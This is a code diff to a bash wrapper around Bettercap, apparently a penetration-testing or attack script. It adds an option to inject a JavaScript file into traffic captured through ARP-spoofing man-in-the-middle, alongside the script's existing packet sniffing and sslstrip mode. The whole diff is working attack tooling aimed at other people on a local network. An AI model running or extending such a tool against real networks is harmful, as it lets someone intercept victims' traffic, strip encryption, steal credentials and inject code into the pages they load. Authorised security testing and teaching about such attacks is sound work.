@@ -9,7 +9,7 @@
 error_checking() {
     command -v bettercap >/dev/null 2>&1 || { echo >&2 "[!] Bettercap is not installed."; exit 1; }
     case $1 in
-        --strip|"")
+        --strip|""|--injectjs)
             ;;
         *)
             usage
@@ -24,6 +24,7 @@ usage() {
 where <parameter> is:
     <empty> Run Bettercap as MitM.
     --strip Enable sslstrip.
+    --injectjs <filepath> Inject the JS code in the given file.
 "
 }
 
@@ -32,7 +33,7 @@ sslstrip() {
 }
 
 mitm_sniff() {
-    sudo bettercap -I ${INTERFACE} ${TARGET} --spoofer ARP -X --sniffer-output capture.pcap | tee -a bettercap.log
+    sudo bettercap -I ${INTERFACE} ${TARGET} ${INJECT_JS_FILE} --spoofer ARP -X --sniffer-output capture.pcap | tee -a bettercap.log
 }
 
 user_input() {
@@ -53,6 +54,7 @@ user_input() {
 }
 
 BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")
+INJECT_JS_FILE=""
 
 ## Check all arguments for validation before beginning attack
 error_checking $@
@@ -66,6 +68,10 @@ do
     case $var in
         --strip)
             sslstrip &
+            ;;
+        --injectjs)
+            INJECT_JS_FILE="--proxy-module injectjs --js-file $2 "
+            shift
             ;;
         *)
             break
